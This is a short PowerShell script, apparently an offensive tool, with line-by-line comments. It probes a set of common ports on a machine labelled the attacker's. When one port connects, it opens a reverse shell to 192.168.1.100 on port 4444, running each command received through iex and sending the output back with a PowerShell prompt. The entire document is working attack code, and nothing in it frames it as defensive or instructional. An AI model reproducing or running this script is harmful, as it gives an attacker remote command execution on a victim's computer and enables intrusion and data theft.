# Set the attacker's IP address and port number
$attackerIP = "192.168.1.100"
$attackerPort = 4444

# Define an array of port numbers to check
$portsToCheck = @(
    21, # FTP
    22, # SSH
    23, # Telnet
    25, # SMTP
    80, # HTTP
    443 # HTTPS
)

# Loop through the array of port numbers
foreach ($port in $portsToCheck) {
    # Create a new TCP client object
    $client = New-Object System.Net.Sockets.TcpClient
    # Attempt to connect to the specified port on the attacker's machine
    $result = $client.BeginConnect($attackerIP, $port, $null, $null)
    # Wait for 500 milliseconds
    Start-Sleep -Milliseconds 500
    # Check if the connection was successful
    if ($client.Connected) {
        # Close the TCP client object
        $client.Close()
        # Print a message to the console indicating that the port is open
        Write-Host "Port $port is open!"
        # Create a new TCP client object to connect to the attacker's machine
        $client = New-Object System.Net.Sockets.TCPClient($attackerIP,$attackerPort)
        # Get the network stream object associated with the TCP client object
        $stream = $client.GetStream()
        # Create a byte array to store incoming data
        [byte[]]$bytes = 0..65535|%{0}
        # Read data from the network stream until there is no more data to read
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            # Convert the incoming data to a string
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            # Execute the incoming data as a PowerShell command and capture the output
            $sendback = (iex $data 2>&1 | Out-String )
            # Append a PowerShell prompt to the output
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            # Convert the output to a byte array and write it to the network stream
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        # Close the TCP client object
        $client.Close()
    }
}